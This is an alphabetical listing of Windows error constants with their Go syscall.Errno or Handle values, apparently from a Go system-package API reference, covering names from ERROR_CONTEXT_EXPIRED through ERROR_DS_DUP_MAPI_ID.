ERROR_CONTEXT_EXPIRED                                                     syscall.Errno = 1931
ERROR_CONTINUE                                                            syscall.Errno = 1246
ERROR_CONTROLLING_IEPORT                                                  syscall.Errno = 4329
ERROR_CONTROL_C_EXIT                                                      syscall.Errno = 572
ERROR_CONTROL_ID_NOT_FOUND                                                syscall.Errno = 1421
ERROR_CONVERT_TO_LARGE                                                    syscall.Errno = 600
ERROR_CORE_DRIVER_PACKAGE_NOT_FOUND                                       syscall.Errno = 3016
ERROR_CORE_RESOURCE                                                       syscall.Errno = 5026
ERROR_CORRUPT_LOG_CLEARED                                                 syscall.Errno = 798
ERROR_CORRUPT_LOG_CORRUPTED                                               syscall.Errno = 795
ERROR_CORRUPT_LOG_DELETED_FULL                                            syscall.Errno = 797
ERROR_CORRUPT_LOG_OVERFULL                                                syscall.Errno = 794
ERROR_CORRUPT_LOG_UNAVAILABLE                                             syscall.Errno = 796
ERROR_CORRUPT_SYSTEM_FILE                                                 syscall.Errno = 634
ERROR_COULD_NOT_INTERPRET                                                 syscall.Errno = 552
ERROR_COULD_NOT_RESIZE_LOG                                                syscall.Errno = 6629
ERROR_COUNTER_TIMEOUT                                                     syscall.Errno = 1121
ERROR_CPU_SET_INVALID                                                     syscall.Errno = 813
ERROR_CRASH_DUMP                                                          syscall.Errno = 753
ERROR_CRC                                                                 syscall.Errno = 23
ERROR_CREATE_FAILED                                                       syscall.Errno = 1631
ERROR_CRED_REQUIRES_CONFIRMATION                                          Handle        = 0x80097019
ERROR_CRM_PROTOCOL_ALREADY_EXISTS                                         syscall.Errno = 6710
ERROR_CRM_PROTOCOL_NOT_FOUND                                              syscall.Errno = 6712
ERROR_CROSS_PARTITION_VIOLATION                                           syscall.Errno = 1661
ERROR_CSCSHARE_OFFLINE                                                    syscall.Errno = 1262
ERROR_CSV_VOLUME_NOT_LOCAL                                                syscall.Errno = 5951
ERROR_CS_ENCRYPTION_EXISTING_ENCRYPTED_FILE                               syscall.Errno = 6019
ERROR_CS_ENCRYPTION_FILE_NOT_CSE                                          syscall.Errno = 6021
ERROR_CS_ENCRYPTION_INVALID_SERVER_RESPONSE                               syscall.Errno = 6017
ERROR_CS_ENCRYPTION_NEW_ENCRYPTED_FILE                                    syscall.Errno = 6020
ERROR_CS_ENCRYPTION_UNSUPPORTED_SERVER                                    syscall.Errno = 6018
ERROR_CTLOG_INCONSISTENT_TRACKING_FILE                                    syscall.Errno = 0xC03A0024
ERROR_CTLOG_INVALID_TRACKING_STATE                                        syscall.Errno = 0xC03A0023
ERROR_CTLOG_LOGFILE_SIZE_EXCEEDED_MAXSIZE                                 syscall.Errno = 0xC03A0021
ERROR_CTLOG_TRACKING_NOT_INITIALIZED                                      syscall.Errno = 0xC03A0020
ERROR_CTLOG_VHD_CHANGED_OFFLINE                                           syscall.Errno = 0xC03A0022
ERROR_CTX_ACCOUNT_RESTRICTION                                             syscall.Errno = 7064
ERROR_CTX_BAD_VIDEO_MODE                                                  syscall.Errno = 7025
ERROR_CTX_CANNOT_MAKE_EVENTLOG_ENTRY                                      syscall.Errno = 7005
ERROR_CTX_CDM_CONNECT                                                     syscall.Errno = 7066
ERROR_CTX_CDM_DISCONNECT                                                  syscall.Errno = 7067
ERROR_CTX_CLIENT_LICENSE_IN_USE                                           syscall.Errno = 7052
ERROR_CTX_CLIENT_LICENSE_NOT_SET                                          syscall.Errno = 7053
ERROR_CTX_CLIENT_QUERY_TIMEOUT                                            syscall.Errno = 7040
ERROR_CTX_CLOSE_PENDING                                                   syscall.Errno = 7007
ERROR_CTX_CONSOLE_CONNECT                                                 syscall.Errno = 7042
ERROR_CTX_CONSOLE_DISCONNECT                                              syscall.Errno = 7041
ERROR_CTX_ENCRYPTION_LEVEL_REQUIRED                                       syscall.Errno = 7061
ERROR_CTX_GRAPHICS_INVALID                                                syscall.Errno = 7035
ERROR_CTX_INVALID_MODEMNAME                                               syscall.Errno = 7010
ERROR_CTX_INVALID_PD                                                      syscall.Errno = 7002
ERROR_CTX_INVALID_WD                                                      syscall.Errno = 7049
ERROR_CTX_LICENSE_CLIENT_INVALID                                          syscall.Errno = 7055
ERROR_CTX_LICENSE_EXPIRED                                                 syscall.Errno = 7056
ERROR_CTX_LICENSE_NOT_AVAILABLE                                           syscall.Errno = 7054
ERROR_CTX_LOGON_DISABLED                                                  syscall.Errno = 7037
ERROR_CTX_MODEM_INF_NOT_FOUND                                             syscall.Errno = 7009
ERROR_CTX_MODEM_RESPONSE_BUSY                                             syscall.Errno = 7015
ERROR_CTX_MODEM_RESPONSE_ERROR                                            syscall.Errno = 7011
ERROR_CTX_MODEM_RESPONSE_NO_CARRIER                                       syscall.Errno = 7013
ERROR_CTX_MODEM_RESPONSE_NO_DIALTONE                                      syscall.Errno = 7014
ERROR_CTX_MODEM_RESPONSE_TIMEOUT                                          syscall.Errno = 7012
ERROR_CTX_MODEM_RESPONSE_VOICE                                            syscall.Errno = 7016
ERROR_CTX_NOT_CONSOLE                                                     syscall.Errno = 7038
ERROR_CTX_NO_FORCE_LOGOFF                                                 syscall.Errno = 7063
ERROR_CTX_NO_OUTBUF                                                       syscall.Errno = 7008
ERROR_CTX_PD_NOT_FOUND                                                    syscall.Errno = 7003
ERROR_CTX_SECURITY_LAYER_ERROR                                            syscall.Errno = 7068
ERROR_CTX_SERVICE_NAME_COLLISION                                          syscall.Errno = 7006
ERROR_CTX_SESSION_IN_USE                                                  syscall.Errno = 7062
ERROR_CTX_SHADOW_DENIED                                                   syscall.Errno = 7044
ERROR_CTX_SHADOW_DISABLED                                                 syscall.Errno = 7051
ERROR_CTX_SHADOW_ENDED_BY_MODE_CHANGE                                     syscall.Errno = 7058
ERROR_CTX_SHADOW_INVALID                                                  syscall.Errno = 7050
ERROR_CTX_SHADOW_NOT_RUNNING                                              syscall.Errno = 7057
ERROR_CTX_TD_ERROR                                                        syscall.Errno = 7017
ERROR_CTX_WD_NOT_FOUND                                                    syscall.Errno = 7004
ERROR_CTX_WINSTATIONS_DISABLED                                            syscall.Errno = 7060
ERROR_CTX_WINSTATION_ACCESS_DENIED                                        syscall.Errno = 7045
ERROR_CTX_WINSTATION_ALREADY_EXISTS                                       syscall.Errno = 7023
ERROR_CTX_WINSTATION_BUSY                                                 syscall.Errno = 7024
ERROR_CTX_WINSTATION_NAME_INVALID                                         syscall.Errno = 7001
ERROR_CTX_WINSTATION_NOT_FOUND                                            syscall.Errno = 7022
ERROR_CURRENT_DIRECTORY                                                   syscall.Errno = 16
ERROR_CURRENT_DOMAIN_NOT_ALLOWED                                          syscall.Errno = 1399
ERROR_CURRENT_TRANSACTION_NOT_VALID                                       syscall.Errno = 6714
ERROR_DATABASE_BACKUP_CORRUPT                                             syscall.Errno = 5087
ERROR_DATABASE_DOES_NOT_EXIST                                             syscall.Errno = 1065
ERROR_DATABASE_FAILURE                                                    syscall.Errno = 4313
ERROR_DATABASE_FULL                                                       syscall.Errno = 4314
ERROR_DATATYPE_MISMATCH                                                   syscall.Errno = 1629
ERROR_DATA_CHECKSUM_ERROR                                                 syscall.Errno = 323
ERROR_DATA_LOST_REPAIR                                                    syscall.Errno = 6843
ERROR_DATA_NOT_ACCEPTED                                                   syscall.Errno = 592
ERROR_DAX_MAPPING_EXISTS                                                  syscall.Errno = 361
ERROR_DBG_ATTACH_PROCESS_FAILURE_LOCKDOWN                                 Handle        = 0x80B00002
ERROR_DBG_COMMAND_EXCEPTION                                               syscall.Errno = 697
ERROR_DBG_CONNECT_SERVER_FAILURE_LOCKDOWN                                 Handle        = 0x80B00003
ERROR_DBG_CONTINUE                                                        syscall.Errno = 767
ERROR_DBG_CONTROL_BREAK                                                   syscall.Errno = 696
ERROR_DBG_CONTROL_C                                                       syscall.Errno = 693
ERROR_DBG_CREATE_PROCESS_FAILURE_LOCKDOWN                                 Handle        = 0x80B00001
ERROR_DBG_EXCEPTION_HANDLED                                               syscall.Errno = 766
ERROR_DBG_EXCEPTION_NOT_HANDLED                                           syscall.Errno = 688
ERROR_DBG_PRINTEXCEPTION_C                                                syscall.Errno = 694
ERROR_DBG_REPLY_LATER                                                     syscall.Errno = 689
ERROR_DBG_RIPEXCEPTION                                                    syscall.Errno = 695
ERROR_DBG_START_SERVER_FAILURE_LOCKDOWN                                   Handle        = 0x80B00004
ERROR_DBG_TERMINATE_PROCESS                                               syscall.Errno = 692
ERROR_DBG_TERMINATE_THREAD                                                syscall.Errno = 691
ERROR_DBG_UNABLE_TO_PROVIDE_HANDLE                                        syscall.Errno = 690
ERROR_DC_NOT_FOUND                                                        syscall.Errno = 1425
ERROR_DDE_FAIL                                                            syscall.Errno = 1156
ERROR_DEBUGGER_INACTIVE                                                   syscall.Errno = 1284
ERROR_DEBUG_ATTACH_FAILED                                                 syscall.Errno = 590
ERROR_DECRYPTION_FAILED                                                   syscall.Errno = 6001
ERROR_DELAY_LOAD_FAILED                                                   syscall.Errno = 1285
ERROR_DELETE_PENDING                                                      syscall.Errno = 303
ERROR_DELETING_EXISTING_APPLICATIONDATA_STORE_FAILED                      syscall.Errno = 15621
ERROR_DELETING_ICM_XFORM                                                  syscall.Errno = 2019
ERROR_DEPENDENCY_ALREADY_EXISTS                                           syscall.Errno = 5003
ERROR_DEPENDENCY_NOT_ALLOWED                                              syscall.Errno = 5069
ERROR_DEPENDENCY_NOT_FOUND                                                syscall.Errno = 5002
ERROR_DEPENDENCY_TREE_TOO_COMPLEX                                         syscall.Errno = 5929
ERROR_DEPENDENT_RESOURCE_EXISTS                                           syscall.Errno = 5001
ERROR_DEPENDENT_RESOURCE_PROPERTY_CONFLICT                                syscall.Errno = 5924
ERROR_DEPENDENT_SERVICES_RUNNING                                          syscall.Errno = 1051
ERROR_DEPLOYMENT_BLOCKED_BY_POLICY                                        syscall.Errno = 15617
ERROR_DEPLOYMENT_BLOCKED_BY_PROFILE_POLICY                                syscall.Errno = 15651
ERROR_DEPLOYMENT_BLOCKED_BY_USER_LOG_OFF                                  syscall.Errno = 15641
ERROR_DEPLOYMENT_BLOCKED_BY_VOLUME_POLICY_MACHINE                         syscall.Errno = 15650
ERROR_DEPLOYMENT_BLOCKED_BY_VOLUME_POLICY_PACKAGE                         syscall.Errno = 15649
ERROR_DEPLOYMENT_FAILED_CONFLICTING_MUTABLE_PACKAGE_DIRECTORY             syscall.Errno = 15652
ERROR_DEPLOYMENT_OPTION_NOT_SUPPORTED                                     syscall.Errno = 15645
ERROR_DESTINATION_ELEMENT_FULL                                            syscall.Errno = 1161
ERROR_DESTROY_OBJECT_OF_OTHER_THREAD                                      syscall.Errno = 1435
ERROR_DEVICE_ALREADY_ATTACHED                                             syscall.Errno = 548
ERROR_DEVICE_ALREADY_REMEMBERED                                           syscall.Errno = 1202
ERROR_DEVICE_DOOR_OPEN                                                    syscall.Errno = 1166
ERROR_DEVICE_ENUMERATION_ERROR                                            syscall.Errno = 648
ERROR_DEVICE_FEATURE_NOT_SUPPORTED                                        syscall.Errno = 316
ERROR_DEVICE_HARDWARE_ERROR                                               syscall.Errno = 483
ERROR_DEVICE_HINT_NAME_BUFFER_TOO_SMALL                                   syscall.Errno = 355
ERROR_DEVICE_INSTALLER_NOT_READY             Errno = 0x20000000 
ERROR_DEVICE_INSTALL_BLOCKED                 Errno = 0x20000000 
ERROR_DEVICE_INTERFACE_ACTIVE                Errno = 0x20000000 
ERROR_DEVICE_INTERFACE_REMOVED               Errno = 0x20000000 
ERROR_DEVICE_IN_MAINTENANCE                                               syscall.Errno = 359
ERROR_DEVICE_IN_USE                                                       syscall.Errno = 2404
ERROR_DEVICE_NOT_AVAILABLE                                                syscall.Errno = 4319
ERROR_DEVICE_NOT_CONNECTED                                                syscall.Errno = 1167
ERROR_DEVICE_NOT_PARTITIONED                                              syscall.Errno = 1107
ERROR_DEVICE_NO_RESOURCES                                                 syscall.Errno = 322
ERROR_DEVICE_REINITIALIZATION_NEEDED                                      syscall.Errno = 1164
ERROR_DEVICE_REMOVED                                                      syscall.Errno = 1617
ERROR_DEVICE_REQUIRES_CLEANING                                            syscall.Errno = 1165
ERROR_DEVICE_SUPPORT_IN_PROGRESS                                          syscall.Errno = 171
ERROR_DEVICE_UNREACHABLE                                                  syscall.Errno = 321
ERROR_DEVINFO_DATA_LOCKED                    Errno = 0x20000000 
ERROR_DEVINFO_LIST_LOCKED                    Errno = 0x20000000 
ERROR_DEVINFO_NOT_REGISTERED                 Errno = 0x20000000 
ERROR_DEVINSTALL_QUEUE_NONNATIVE             Errno = 0x20000000 
ERROR_DEVINST_ALREADY_EXISTS                 Errno = 0x20000000 
ERROR_DEV_NOT_EXIST                                                       syscall.Errno = 55
ERROR_DEV_SIDELOAD_LIMIT_EXCEEDED                                         syscall.Errno = 15633
ERROR_DHCP_ADDRESS_CONFLICT                                               syscall.Errno = 4100
ERROR_DIFFERENT_PROFILE_RESOURCE_MANAGER_EXIST                            syscall.Errno = 15144
ERROR_DIFFERENT_SERVICE_ACCOUNT                                           syscall.Errno = 1079
ERROR_DIFFERENT_VERSION_OF_PACKAGED_SERVICE_INSTALLED                     syscall.Errno = 15654
ERROR_DIRECTORY                                                           syscall.Errno = 267
ERROR_DIRECTORY_NOT_RM                                                    syscall.Errno = 6803
ERROR_DIRECTORY_NOT_SUPPORTED                                             syscall.Errno = 336
ERROR_DIRECT_ACCESS_HANDLE                                                syscall.Errno = 130
ERROR_DIR_EFS_DISALLOWED                                                  syscall.Errno = 6010
ERROR_DIR_NOT_EMPTY                                                       syscall.Errno = 145
ERROR_DIR_NOT_ROOT                                                        syscall.Errno = 144
ERROR_DISCARDED                                                           syscall.Errno = 157
ERROR_DISK_CHANGE                                                         syscall.Errno = 107
ERROR_DISK_CORRUPT                                                        syscall.Errno = 1393
ERROR_DISK_FULL                                                           syscall.Errno = 112
ERROR_DISK_NOT_CSV_CAPABLE                                                syscall.Errno = 5964
ERROR_DISK_OPERATION_FAILED                                               syscall.Errno = 1127
ERROR_DISK_QUOTA_EXCEEDED                                                 syscall.Errno = 1295
ERROR_DISK_RECALIBRATE_FAILED                                             syscall.Errno = 1126
ERROR_DISK_REPAIR_DISABLED                                                syscall.Errno = 780
ERROR_DISK_REPAIR_REDIRECTED                                              syscall.Errno = 792
ERROR_DISK_REPAIR_UNSUCCESSFUL                                            syscall.Errno = 793
ERROR_DISK_RESET_FAILED                                                   syscall.Errno = 1128
ERROR_DISK_RESOURCES_EXHAUSTED                                            syscall.Errno = 314
ERROR_DISK_TOO_FRAGMENTED                                                 syscall.Errno = 302
ERROR_DI_BAD_PATH                            Errno = 0x20000000 
ERROR_DI_DONT_INSTALL                        Errno = 0x20000000 
ERROR_DI_DO_DEFAULT                          Errno = 0x20000000 
ERROR_DI_FUNCTION_OBSOLETE                   Errno = 0x20000000 
ERROR_DI_NOFILECOPY                          Errno = 0x20000000 
ERROR_DI_POSTPROCESSING_REQUIRED             Errno = 0x20000000 
ERROR_DLL_INIT_FAILED                                                     syscall.Errno = 1114
ERROR_DLL_INIT_FAILED_LOGOFF                                              syscall.Errno = 624
ERROR_DLL_MIGHT_BE_INCOMPATIBLE                                           syscall.Errno = 687
ERROR_DLL_MIGHT_BE_INSECURE                                               syscall.Errno = 686
ERROR_DLL_NOT_FOUND                                                       syscall.Errno = 1157
ERROR_DOMAIN_CONTROLLER_EXISTS                                            syscall.Errno = 1250
ERROR_DOMAIN_CONTROLLER_NOT_FOUND                                         syscall.Errno = 1908
ERROR_DOMAIN_CTRLR_CONFIG_ERROR                                           syscall.Errno = 581
ERROR_DOMAIN_EXISTS                                                       syscall.Errno = 1356
ERROR_DOMAIN_LIMIT_EXCEEDED                                               syscall.Errno = 1357
ERROR_DOMAIN_SID_SAME_AS_LOCAL_WORKSTATION                                syscall.Errno = 8644
ERROR_DOMAIN_TRUST_INCONSISTENT                                           syscall.Errno = 1810
ERROR_DOWNGRADE_DETECTED                                                  syscall.Errno = 1265
ERROR_DPL_NOT_SUPPORTED_FOR_USER                                          syscall.Errno = 423
ERROR_DRIVERS_LEAKING_LOCKED_PAGES                                        syscall.Errno = 729
ERROR_DRIVER_BLOCKED                                                      syscall.Errno = 1275
ERROR_DRIVER_CANCEL_TIMEOUT                                               syscall.Errno = 594
ERROR_DRIVER_DATABASE_ERROR                                               syscall.Errno = 652
ERROR_DRIVER_FAILED_PRIOR_UNLOAD                                          syscall.Errno = 654
ERROR_DRIVER_FAILED_SLEEP                                                 syscall.Errno = 633
ERROR_DRIVER_INSTALL_BLOCKED                 Errno = 0x20000000 
ERROR_DRIVER_NONNATIVE                       Errno = 0x20000000 
ERROR_DRIVER_PROCESS_TERMINATED                                           syscall.Errno = 1291
ERROR_DRIVER_STORE_ADD_FAILED                Errno = 0x20000000 
ERROR_DRIVER_STORE_DELETE_FAILED             Errno = 0x20000000 
ERROR_DRIVE_LOCKED                                                        syscall.Errno = 108
ERROR_DRIVE_MEDIA_MISMATCH                                                syscall.Errno = 4303
ERROR_DS_ADD_REPLICA_INHIBITED                                            syscall.Errno = 8302
ERROR_DS_ADMIN_LIMIT_EXCEEDED                                             syscall.Errno = 8228
ERROR_DS_AFFECTS_MULTIPLE_DSAS                                            syscall.Errno = 8249
ERROR_DS_AG_CANT_HAVE_UNIVERSAL_MEMBER                                    syscall.Errno = 8578
ERROR_DS_ALIASED_OBJ_MISSING                                              syscall.Errno = 8334
ERROR_DS_ALIAS_DEREF_PROBLEM                                              syscall.Errno = 8244
ERROR_DS_ALIAS_POINTS_TO_ALIAS                                            syscall.Errno = 8336
ERROR_DS_ALIAS_PROBLEM                                                    syscall.Errno = 8241
ERROR_DS_ATTRIBUTE_OR_VALUE_EXISTS                                        syscall.Errno = 8205
ERROR_DS_ATTRIBUTE_OWNED_BY_SAM                                           syscall.Errno = 8346
ERROR_DS_ATTRIBUTE_TYPE_UNDEFINED                                         syscall.Errno = 8204
ERROR_DS_ATT_ALREADY_EXISTS                                               syscall.Errno = 8318
ERROR_DS_ATT_IS_NOT_ON_OBJ                                                syscall.Errno = 8310
ERROR_DS_ATT_NOT_DEF_FOR_CLASS                                            syscall.Errno = 8317
ERROR_DS_ATT_NOT_DEF_IN_SCHEMA                                            syscall.Errno = 8303
ERROR_DS_ATT_SCHEMA_REQ_ID                                                syscall.Errno = 8399
ERROR_DS_ATT_SCHEMA_REQ_SYNTAX                                            syscall.Errno = 8416
ERROR_DS_ATT_VAL_ALREADY_EXISTS                                           syscall.Errno = 8323
ERROR_DS_AUDIT_FAILURE                                                    syscall.Errno = 8625
ERROR_DS_AUTHORIZATION_FAILED                                             syscall.Errno = 8599
ERROR_DS_AUTH_METHOD_NOT_SUPPORTED                                        syscall.Errno = 8231
ERROR_DS_AUTH_UNKNOWN                                                     syscall.Errno = 8234
ERROR_DS_AUX_CLS_TEST_FAIL                                                syscall.Errno = 8389
ERROR_DS_BACKLINK_WITHOUT_LINK                                            syscall.Errno = 8482
ERROR_DS_BAD_ATT_SCHEMA_SYNTAX                                            syscall.Errno = 8400
ERROR_DS_BAD_HIERARCHY_FILE                                               syscall.Errno = 8425
ERROR_DS_BAD_INSTANCE_TYPE                                                syscall.Errno = 8313
ERROR_DS_BAD_NAME_SYNTAX                                                  syscall.Errno = 8335
ERROR_DS_BAD_RDN_ATT_ID_SYNTAX                                            syscall.Errno = 8392
ERROR_DS_BUILD_HIERARCHY_TABLE_FAILED                                     syscall.Errno = 8426
ERROR_DS_BUSY                                                             syscall.Errno = 8206
ERROR_DS_CANT_ACCESS_REMOTE_PART_OF_AD                                    syscall.Errno = 8585
ERROR_DS_CANT_ADD_ATT_VALUES                                              syscall.Errno = 8320
ERROR_DS_CANT_ADD_SYSTEM_ONLY                                             syscall.Errno = 8358
ERROR_DS_CANT_ADD_TO_GC                                                   syscall.Errno = 8550
ERROR_DS_CANT_CACHE_ATT                                                   syscall.Errno = 8401
ERROR_DS_CANT_CACHE_CLASS                                                 syscall.Errno = 8402
ERROR_DS_CANT_CREATE_IN_NONDOMAIN_NC                                      syscall.Errno = 8553
ERROR_DS_CANT_CREATE_UNDER_SCHEMA                                         syscall.Errno = 8510
ERROR_DS_CANT_DELETE                                                      syscall.Errno = 8398
ERROR_DS_CANT_DELETE_DSA_OBJ                                              syscall.Errno = 8340
ERROR_DS_CANT_DEL_MASTER_CROSSREF                                         syscall.Errno = 8375
ERROR_DS_CANT_DEMOTE_WITH_WRITEABLE_NC                                    syscall.Errno = 8604
ERROR_DS_CANT_DEREF_ALIAS                                                 syscall.Errno = 8337
ERROR_DS_CANT_DERIVE_SPN_FOR_DELETED_DOMAIN                               syscall.Errno = 8603
ERROR_DS_CANT_DERIVE_SPN_WITHOUT_SERVER_REF                               syscall.Errno = 8589
ERROR_DS_CANT_FIND_DC_FOR_SRC_DOMAIN                                      syscall.Errno = 8537
ERROR_DS_CANT_FIND_DSA_OBJ                                                syscall.Errno = 8419
ERROR_DS_CANT_FIND_EXPECTED_NC                                            syscall.Errno = 8420
ERROR_DS_CANT_FIND_NC_IN_CACHE                                            syscall.Errno = 8421
ERROR_DS_CANT_MIX_MASTER_AND_REPS                                         syscall.Errno = 8331
ERROR_DS_CANT_MOD_OBJ_CLASS                                               syscall.Errno = 8215
ERROR_DS_CANT_MOD_PRIMARYGROUPID                                          syscall.Errno = 8506
ERROR_DS_CANT_MOD_SYSTEM_ONLY                                             syscall.Errno = 8369
ERROR_DS_CANT_MOVE_ACCOUNT_GROUP                                          syscall.Errno = 8498
ERROR_DS_CANT_MOVE_APP_BASIC_GROUP                                        syscall.Errno = 8608
ERROR_DS_CANT_MOVE_APP_QUERY_GROUP                                        syscall.Errno = 8609
ERROR_DS_CANT_MOVE_DELETED_OBJECT                                         syscall.Errno = 8489
ERROR_DS_CANT_MOVE_RESOURCE_GROUP                                         syscall.Errno = 8499
ERROR_DS_CANT_ON_NON_LEAF                                                 syscall.Errno = 8213
ERROR_DS_CANT_ON_RDN                                                      syscall.Errno = 8214
ERROR_DS_CANT_REMOVE_ATT_CACHE                                            syscall.Errno = 8403
ERROR_DS_CANT_REMOVE_CLASS_CACHE                                          syscall.Errno = 8404
ERROR_DS_CANT_REM_MISSING_ATT                                             syscall.Errno = 8324
ERROR_DS_CANT_REM_MISSING_ATT_VAL                                         syscall.Errno = 8325
ERROR_DS_CANT_REPLACE_HIDDEN_REC                                          syscall.Errno = 8424
ERROR_DS_CANT_RETRIEVE_ATTS                                               syscall.Errno = 8481
ERROR_DS_CANT_RETRIEVE_CHILD                                              syscall.Errno = 8422
ERROR_DS_CANT_RETRIEVE_DN                                                 syscall.Errno = 8405
ERROR_DS_CANT_RETRIEVE_INSTANCE                                           syscall.Errno = 8407
ERROR_DS_CANT_RETRIEVE_SD                                                 syscall.Errno = 8526
ERROR_DS_CANT_START                                                       syscall.Errno = 8531
ERROR_DS_CANT_TREE_DELETE_CRITICAL_OBJ                                    syscall.Errno = 8560
ERROR_DS_CANT_WITH_ACCT_GROUP_MEMBERSHPS                                  syscall.Errno = 8493
ERROR_DS_CHILDREN_EXIST                                                   syscall.Errno = 8332
ERROR_DS_CLASS_MUST_BE_CONCRETE                                           syscall.Errno = 8359
ERROR_DS_CLASS_NOT_DSA                                                    syscall.Errno = 8343
ERROR_DS_CLIENT_LOOP                                                      syscall.Errno = 8259
ERROR_DS_CODE_INCONSISTENCY                                               syscall.Errno = 8408
ERROR_DS_COMPARE_FALSE                                                    syscall.Errno = 8229
ERROR_DS_COMPARE_TRUE                                                     syscall.Errno = 8230
ERROR_DS_CONFIDENTIALITY_REQUIRED                                         syscall.Errno = 8237
ERROR_DS_CONFIG_PARAM_MISSING                                             syscall.Errno = 8427
ERROR_DS_CONSTRAINT_VIOLATION                                             syscall.Errno = 8239
ERROR_DS_CONSTRUCTED_ATT_MOD                                              syscall.Errno = 8475
ERROR_DS_CONTROL_NOT_FOUND                                                syscall.Errno = 8258
ERROR_DS_COULDNT_CONTACT_FSMO                                             syscall.Errno = 8367
ERROR_DS_COULDNT_IDENTIFY_OBJECTS_FOR_TREE_DELETE                         syscall.Errno = 8503
ERROR_DS_COULDNT_LOCK_TREE_FOR_DELETE                                     syscall.Errno = 8502
ERROR_DS_COULDNT_UPDATE_SPNS                                              syscall.Errno = 8525
ERROR_DS_COUNTING_AB_INDICES_FAILED                                       syscall.Errno = 8428
ERROR_DS_CROSS_DOMAIN_CLEANUP_REQD                                        syscall.Errno = 8491
ERROR_DS_CROSS_DOM_MOVE_ERROR                                             syscall.Errno = 8216
ERROR_DS_CROSS_NC_DN_RENAME                                               syscall.Errno = 8368
ERROR_DS_CROSS_REF_BUSY                                                   syscall.Errno = 8602
ERROR_DS_CROSS_REF_EXISTS                                                 syscall.Errno = 8374
ERROR_DS_CR_IMPOSSIBLE_TO_VALIDATE                                        syscall.Errno = 8495
ERROR_DS_CR_IMPOSSIBLE_TO_VALIDATE_V2                                     syscall.Errno = 8586
ERROR_DS_DATABASE_ERROR                                                   syscall.Errno = 8409
ERROR_DS_DECODING_ERROR                                                   syscall.Errno = 8253
ERROR_DS_DESTINATION_AUDITING_NOT_ENABLED                                 syscall.Errno = 8536
ERROR_DS_DESTINATION_DOMAIN_NOT_IN_FOREST                                 syscall.Errno = 8535
ERROR_DS_DIFFERENT_REPL_EPOCHS                                            syscall.Errno = 8593
ERROR_DS_DISALLOWED_IN_SYSTEM_CONTAINER                                   syscall.Errno = 8615
ERROR_DS_DISALLOWED_NC_REDIRECT                                           syscall.Errno = 8640
ERROR_DS_DNS_LOOKUP_FAILURE                                               syscall.Errno = 8524
ERROR_DS_DOMAIN_NAME_EXISTS_IN_FOREST                                     syscall.Errno = 8634
ERROR_DS_DOMAIN_RENAME_IN_PROGRESS                                        syscall.Errno = 8612
ERROR_DS_DOMAIN_VERSION_TOO_HIGH                                          syscall.Errno = 8564
ERROR_DS_DOMAIN_VERSION_TOO_LOW                                           syscall.Errno = 8566
ERROR_DS_DRA_ABANDON_SYNC                                                 syscall.Errno = 8462
ERROR_DS_DRA_ACCESS_DENIED                                                syscall.Errno = 8453
ERROR_DS_DRA_BAD_DN                                                       syscall.Errno = 8439
ERROR_DS_DRA_BAD_INSTANCE_TYPE                                            syscall.Errno = 8445
ERROR_DS_DRA_BAD_NC                                                       syscall.Errno = 8440
ERROR_DS_DRA_BUSY                                                         syscall.Errno = 8438
ERROR_DS_DRA_CONNECTION_FAILED                                            syscall.Errno = 8444
ERROR_DS_DRA_CORRUPT_UTD_VECTOR                                           syscall.Errno = 8629
ERROR_DS_DRA_DB_ERROR                                                     syscall.Errno = 8451
ERROR_DS_DRA_DN_EXISTS                                                    syscall.Errno = 8441
ERROR_DS_DRA_EARLIER_SCHEMA_CONFLICT                                      syscall.Errno = 8544
ERROR_DS_DRA_EXTN_CONNECTION_FAILED                                       syscall.Errno = 8466
ERROR_DS_DRA_GENERIC                                                      syscall.Errno = 8436
ERROR_DS_DRA_INCOMPATIBLE_PARTIAL_SET                                     syscall.Errno = 8464
ERROR_DS_DRA_INCONSISTENT_DIT                                             syscall.Errno = 8443
ERROR_DS_DRA_INTERNAL_ERROR                                               syscall.Errno = 8442
ERROR_DS_DRA_INVALID_PARAMETER                                            syscall.Errno = 8437
ERROR_DS_DRA_MAIL_PROBLEM                                                 syscall.Errno = 8447
ERROR_DS_DRA_MISSING_KRBTGT_SECRET                                        syscall.Errno = 8633
ERROR_DS_DRA_MISSING_PARENT                                               syscall.Errno = 8460
ERROR_DS_DRA_NAME_COLLISION                                               syscall.Errno = 8458
ERROR_DS_DRA_NOT_SUPPORTED                                                syscall.Errno = 8454
ERROR_DS_DRA_NO_REPLICA                                                   syscall.Errno = 8452
ERROR_DS_DRA_OBJ_IS_REP_SOURCE                                            syscall.Errno = 8450
ERROR_DS_DRA_OBJ_NC_MISMATCH                                              syscall.Errno = 8545
ERROR_DS_DRA_OUT_OF_MEM                                                   syscall.Errno = 8446
ERROR_DS_DRA_OUT_SCHEDULE_WINDOW                                          syscall.Errno = 8617
ERROR_DS_DRA_PREEMPTED                                                    syscall.Errno = 8461
ERROR_DS_DRA_RECYCLED_TARGET                                              syscall.Errno = 8639
ERROR_DS_DRA_REF_ALREADY_EXISTS                                           syscall.Errno = 8448
ERROR_DS_DRA_REF_NOT_FOUND                                                syscall.Errno = 8449
ERROR_DS_DRA_REPL_PENDING                                                 syscall.Errno = 8477
ERROR_DS_DRA_RPC_CANCELLED                                                syscall.Errno = 8455
ERROR_DS_DRA_SCHEMA_CONFLICT                                              syscall.Errno = 8543
ERROR_DS_DRA_SCHEMA_INFO_SHIP                                             syscall.Errno = 8542
ERROR_DS_DRA_SCHEMA_MISMATCH                                              syscall.Errno = 8418
ERROR_DS_DRA_SECRETS_DENIED                                               syscall.Errno = 8630
ERROR_DS_DRA_SHUTDOWN                                                     syscall.Errno = 8463
ERROR_DS_DRA_SINK_DISABLED                                                syscall.Errno = 8457
ERROR_DS_DRA_SOURCE_DISABLED                                              syscall.Errno = 8456
ERROR_DS_DRA_SOURCE_IS_PARTIAL_REPLICA                                    syscall.Errno = 8465
ERROR_DS_DRA_SOURCE_REINSTALLED                                           syscall.Errno = 8459
ERROR_DS_DRS_EXTENSIONS_CHANGED                                           syscall.Errno = 8594
ERROR_DS_DSA_MUST_BE_INT_MASTER                                           syscall.Errno = 8342
ERROR_DS_DST_DOMAIN_NOT_NATIVE                                            syscall.Errno = 8496
ERROR_DS_DST_NC_MISMATCH                                                  syscall.Errno = 8486
ERROR_DS_DS_REQUIRED                                                      syscall.Errno = 8478
ERROR_DS_DUPLICATE_ID_FOUND                                               syscall.Errno = 8605
ERROR_DS_DUP_LDAP_DISPLAY_NAME                                            syscall.Errno = 8382
ERROR_DS_DUP_LINK_ID                                                      syscall.Errno = 8468
ERROR_DS_DUP_MAPI_ID                                                      syscall.Errno = 8380
